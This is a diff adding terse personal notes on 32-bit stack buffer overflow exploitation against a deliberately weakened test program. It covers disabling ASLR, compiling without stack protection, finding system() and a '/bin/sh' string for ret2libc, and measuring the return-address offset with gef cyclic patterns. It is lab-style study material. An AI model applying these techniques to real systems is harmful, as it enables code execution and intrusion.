@@ -1,0 +1,66 @@
+p/d (void *)$epb + 4 - (void *)&buffer
+
+def p32(x):
+    return x.to_bytes(4, 'little')
+
+
+---stack--  higher to lower
+
+ caller's local var
+ caller's saved registers
+ arg 2
+ arg 1
+ return addr  <-- caller's exec this far  <-- while returning callee exec this far
+ saved ebp    <-- callee takes over
+ local var
+---------
+
+$ objdump -d ./vulnerable_program | grep secret_function
+
+(gdb) info functions
+
+nm -C your_program | grep " T "  # Shows defined functions in text section
+
+objdump -t your_program | grep "F .text"  # Shows functions in .text section
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+
+sudo apt-get install gcc-multilib
+
+gcc -m32 -fno-stack-protector -z execstack -no-pie -g program.c -o program
+
+
+--------
+
+(gdb) p system
+    find &system, +9999999, "/bin/sh"
+
+it can fail
+
+get> vmmap
+gef➤  find 0xf7d6b000, +0x200000, "/bin/sh"
+0xf7f280d5
+1 pattern found.
+gef➤  x/s 0xf7f280d5
+0xf7f280d5:	"/bin/sh"
+
+-----
+Generate a cyclic pattern:
+
+bash
+gdb ./your_program
+gef➤  pattern create 100
+Output: aaaabaaacaaadaaaeaaaf...
+
+Crash the program with the pattern:
+
+bash
+gef➤  run < <(python3 -c 'print("aaaabaaacaaad...")')
+Check the value of $eip (or $rip for 64-bit) after the crash:
+
+bash
+gef➤  pattern offset $eip
+This gives the exact offset to the return address.
+-------
+
